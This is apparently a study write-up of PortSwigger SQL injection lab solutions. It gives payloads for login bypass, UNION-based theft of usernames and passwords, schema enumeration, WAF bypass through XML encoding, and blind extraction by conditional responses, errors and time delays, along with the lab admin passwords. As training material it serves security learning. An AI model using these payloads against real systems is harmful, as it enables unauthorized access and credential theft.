# SQL injection

SQL injection allows information retrieval from the database. It can appear in URL parameters, cookies, XML payloads, or any other element that interacts with a database query. This vulnerability can show the results of the injected query in the front end, or can be blind (the results are not shown). For blind vulnerabilities, some techniques can be used to get data from the database (conditional responses, conditional errors, time delays, out-of-band interaction...)

[Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Non-blind SQL injection labs

### [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

Vulnerable URL: https://domain/filter?category=category

Test payload: `category'--`
- This payload shows more products (a condition in the SQL clause was ignored)

To show all products: `category' OR 1=1--`
- `1=1` is an always true statement, meaning the query will return all the results

### [Lab: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

Vulnerable URL: https://domain/login

To log in as administrator: type `administrator'--` in the username and anything in the password
- This payload ignores the verification of the password and logs in only if the user exists

### [Lab: SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL,NULL--`
- If 4 NULLs are provided, the server will return an error (so the query returns 3 columns)

### [Lab: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL,NULL--`

To check the column with the string payload: `category' UNION SELECT NULL,'a',NULL--`
- The second column returns a string payload that can be used to get info from the database
- To solve the lab: `category' UNION SELECT NULL,'kyFUj0',NULL--`

### [Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL--`

To check the column with the string payload: `category' UNION SELECT 'a','a'--`

To retrieve the data: `category' UNION SELECT username,password FROM users--`
- To solve the lab, just log in as `administrator:1tmn9btoqihk657tsaxd`

### [Lab: SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL--`

To check the column with the string payload: `category' UNION SELECT NULL,'a'--`

To retrieve the data: `category' UNION SELECT NULL,username || ':' || password FROM users--`
- Only one column returns a string, so we have to concatenate the content in one column using `||`
- To solve the lab, we just log in as `administrator:93tj2cw6fpat84p6tmna`

### [Lab: SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL FROM dual--`
- On Oracle databases, we have to specify the table when using the `UNION` statement. The `dual` table can be used for that purpose

To check the column with the string payload: `category' UNION SELECT 'a','a' FROM dual--`

To retrieve the data: `category' UNION SELECT BANNER,NULL FROM v$version--`
- The table `v$version` contains information on the database. This table has a column `BANNER` with the database version

### [Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

Vulnerable URL: https://domain/filter?category=category

Test payload: `category'#`
- If `'--` is used, the server will return an error. For that reason, the comment key on this database is a `#`

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL#`

To check the column with the string payload: `category' UNION SELECT 'a','a'#`

To retrieve the data: `category' UNION SELECT @@version,NULL#`
- On SQL Server and MySQL databases, information on the version can be found with `SELECT @@version`

### [Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL--`

To check the column with the string payload: `category' UNION SELECT 'a','a'--`

To get all the tables (and columns on each table) in the database: `category' UNION SELECT table_name,STRING_AGG(column_name, ',') FROM information_schema.columns GROUP BY table_name--`
- This query returns all database tables and their columns. It works on PostgreSQL databases. To use it in MySQL, change `STRING_AGG(column, sep)` to `GROUP_CONCAT(column)`. For other databases, check the documentation for equivalent functions
- The `information_schema.columns` is a table on databases (except Oracle) that has information on all columns from all tables in the database
- Searching through the tables, we can find a `users_xdykim` table with the columns `username_ygnyzx` and `password_wkknxs`

To retrieve all the users: `category' UNION SELECT username_ygnyzx,password_wkknxs FROM users_xdykim--`
- To solve the lab, log in as `administrator:9cwgy2lthvk0ta1ctjos`

### [Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL FROM dual--`

To check the column with the string payload: `category' UNION SELECT 'a','a' FROM dual--`

To get all the tables (and columns on each table) in the database: `category' UNION SELECT table_name,LISTAGG(column_name, ',') WITHIN GROUP(ORDER BY column_name) column_list FROM user_tab_cols GROUP BY table_name--`
- This query returns all database tables and their columns. It works on Oracle databases. The function `LISTAGG(column, sep)` aggregates a column on a row with a separator and requires `WITHIN GROUP(ORDER BY column) group_name` to work
- The `all_tab_columns` is a table on Oracle databases that has information on all columns from all tables in the database
- Searching through the tables, we can find a `USERS_WBZCLJ` table with the columns `USERNAME_WQDOCJ` and `PASSWORD_NLFHLD`

To retrieve all the users: `category' UNION SELECT USERNAME_WQDOCJ,PASSWORD_NLFHLD FROM USERS_WBZCLJ--`
- To solve the lab, log in as `administrator:v4v788550kfkkew3h2oi`


### [Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

Vulnerable URL: https://domain/product/stock
- This URL uses an XML-encoded payload to send data to the database
- There is a storeId element that evaluates expressions (such as sums)

To get the user's information, we need to encode the payload in that element to bypass the WAF protection. The encoded payload to this lab is: `<@dec_entities>1 UNION SELECT username || ':' || password FROM users<@/dec_entities>`
- If the query is written with 2 columns the response will be 0
- This encoding was made with Burp Suite Hackverton extension: Extensions -> Hackvertor -> Encode -> dec_entities

To solve the lab, log in as `administrator:jej4bpjjei2mawfb0xxr`


## Blind SQL injection labs

### [Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

Vulnerable URL: https://domain/filter?category=category
- This URL uses a TrackingId cookie to show a `Welcome back!` message. This cookie is vulnerable to SQL injection

Test payload: `cookie' AND 1=1--` and `cookie' AND 1=2--`
- When `AND 1=1--` is injected the welcome back message shows, but when `AND 1=2--` is injected, the message disappears. The message can be controlled by the injected payload, so the site is vulnerable

To log in as administrator, we need to enumerate the password. To do this, first, we discover the length of the password: `cookie' AND (SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > [size]) = 'administrator'--`
- We need to try this payload by increasing the value of `[size]` until the welcome back message disappears from the screen, when that happens the query will be false and we will have the length of the password
- This step can be done with Burp Intruder, using the sniper attack type using the `[size]` as a numbers type payload or with a written script
- The password is `20` characters long

To enumerate the password, we need to check each character from it. `cookie' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), [position], 1) = '[character]'--`
- This function gets the character in the `[position]`th position of the string and compares with `[character]`. If the comparison is true, the welcome back message will appear in the screen. We need to compare each character from the password (changing the `[position]` value from `1` to `[size]`), with 
a character (brute force the character `[a-z||0-9]`)
- This step can be done with Burp Intruder, using the cluster bomb attack type using the `[position]` as the first payload using the numbers type (from 1 to the size of the password, step 1) and the `[character]` as the second payload using the brute forcer type (selecting the characters to be tested and 1 as min and max length). This step can also be done with a script
- The password is `xcanmptntagtdo2csy32`
- To solve the lab, log in as `administrator:xcanmptntagtdo2csy32`


### [Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

Vulnerable URL: https://domain/filter?category=category
- This URL does not provide any elements that interact with the injected SQL, if we cause errors in the database, the page will render an error

Test payload: `cookie' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE TO_CHAR(1/0) END FROM dual) = 'a'--` and `cookie' AND (SELECT CASE WHEN (1=2) THEN 'a' ELSE TO_CHAR(1/0) END FROM dual) = 'a'--`
- When the first query is injected the page loads normally, but when the second query is injected an error page is loaded due to a 500 error (server error, database error in that case). The site has unhandled database errors, making it vulnerable to blind SQL injection

To get the administrator password, the logic is the same as in the previous lab. It can also be done through Burp Intruder or a script. The only thing that changed is the queries (different technique and database)
- Query to get the password size: `' AND (SELECT CASE WHEN (LENGTH(password) > [size]) THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username = 'administrator') = 'a'--`
- Query to enumerate the password: `' AND (SELECT CASE WHEN (SUBSTR(password, [position], 1) = '[character]') THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username = 'administrator') = 'a'--`

To solve the lab log in as `administrator:r17fdjbk4v1bdmqqisd8`


### [Lab: Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

Vulnerable URL: https://domain/filter?category=category
- This URL does not provide any elements that interact with the injected SQL nor reacts with database errors

Test payload: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
- This payload triggers a time delay that can be confirmed with a long page loading time


### [Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

Vulnerable URL: https://domain/filter?category=category

Test payload: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
- This is a PostgreSQL database

To get the administrator password, the logic is the same as the previous enumeration labs. The queries will be:
- Query to get the password size: `'; SELECT CASE WHEN (LENGTH(password) > [size]) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--`
- Query to enumerate the password: `'; SELECT CASE WHEN (SUBSTR(password, [position], 1) = '[character]') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--`

To solve the lab log in as `administrator:yb1hh06qlempkmxh6yto`


### [Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

This lab requires Burp Collaborator


### [Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

This lab requires Burp Collaborator


## References
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://portswigger.net/web-security/sql-injection/examining-the-database
